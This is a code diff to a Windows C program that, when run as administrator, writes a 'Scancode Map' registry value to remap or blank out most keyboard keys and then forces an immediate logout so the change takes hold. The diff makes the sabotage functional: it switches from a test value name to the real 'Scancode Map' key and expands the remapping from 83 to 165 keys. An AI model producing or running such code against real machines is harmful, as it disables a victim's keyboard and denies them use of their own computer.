@@ -4,6 +4,9 @@
 //registry path HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout
 //registry key Scancode Map
 /*
+ RUN AS ADMIN
+ TESTED IN WINDOWS 7 COMPILED WITH GCC IN NETBEANS 
+ 
  
  00000000 00000000 02000000 00003A00 00000000
  
@@ -18,6 +21,8 @@
  
     http://www.ee.bgu.ac.il/~microlab/MicroLab/Labs/ScanCodes.htm  	 
  */
+void scrambleKeyboard();
+void logout();
 
 int main(){
     scrambleKeyboard();
@@ -28,7 +33,7 @@ int main(){
 void scrambleKeyboard() {
     HKEY hkey;
     char registryKeyValue[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  //pading
-                      0x53, 0x00, 0x00, 0x00,                                   //number of keys to be remapped (83) 
+                      0xA5, 0x00, 0x00, 0x00,                                   //number of keys to be remapped (165) 
                       0x00, 0x00, 0x01, 0x00,
                       0x00, 0x00, 0x02, 0x00,
                       0x00, 0x00, 0x03, 0x00,
@@ -216,7 +221,7 @@ void scrambleKeyboard() {
     }
 
     printf("Writing Value named testval\n");
-    result_write = RegSetValueEx(hkey, "bartolomew", 0, REG_BINARY, registryKeyValue, size);
+    result_write = RegSetValueEx(hkey, "Scancode Map", 0, REG_BINARY, registryKeyValue, size);
     if (result_write != ERROR_SUCCESS) {
         printf("Error Writing Value\n");
     } else {
@@ -233,5 +238,5 @@ void scrambleKeyboard() {
     return 0;
 }
 void logout(){
-    system("shutdown.exe", "-l -t 0");
+    system("shutdown.exe -l -y");
 }
